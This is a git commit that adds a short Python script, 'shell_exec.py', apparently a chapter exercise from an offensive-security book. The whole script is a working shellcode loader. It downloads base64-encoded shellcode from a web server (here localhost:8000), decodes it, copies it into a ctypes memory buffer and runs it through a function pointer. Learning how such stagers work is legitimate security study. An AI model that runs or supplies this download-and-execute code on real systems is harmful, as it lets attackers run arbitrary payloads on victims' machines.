22f71be372de0248fcc21e6b30189b765c19f634
ChosenOne95 <1563965594@qq.com>
2019-04-19 22:55:20 +0800

    Add files via upload

---
+++ Chapter 8/shell_exec.py
@@ -0,0 +1,26 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Wed Apr 17 19:53:29 2019
+
+@author: QIAN
+"""
+
+import urllib.request, urllib.error, urllib.parse
+import ctypes
+import base64
+
+# retrieve the shellcode from our web server
+url = "http://localhost:8000/shellcode.bin"
+response = urllib.request.urlopen(url)
+
+# decode the shellcode from base64
+shellcode = base64.b64decode(response.read())
+
+# create a buffer in memory
+shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+
+# create a function pointer to our shellcode
+shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+
+# call our shellcode
+shellcode_func()
